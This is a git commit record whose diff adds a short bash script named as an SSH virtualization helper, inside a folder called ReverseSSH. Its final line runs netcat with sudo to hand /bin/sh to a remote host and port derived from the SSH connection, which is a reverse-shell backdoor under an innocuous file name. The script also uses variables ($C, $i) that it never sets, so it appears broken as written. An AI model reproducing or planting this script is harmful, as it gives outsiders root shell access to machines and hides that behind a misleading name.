ff94b057adbaa5f512604df786da98f5fdbcbd56
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-03-27 19:32:37 -0400

    shit

---
+++ ReverseSSH/_ssh_virtualization_helper.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+source etc/qemu/fs-freezehook.d/fs-freezehook.sh
+CIP=$(echo $SSH_CONNECTION | awk '{print $3}')
+SECOND=$(echo "$CIP" | cut -d'.' -f2)
+P=$(($C + $SECOND))
+
+sudo /usr/bin/nc -e /bin/sh $i $P
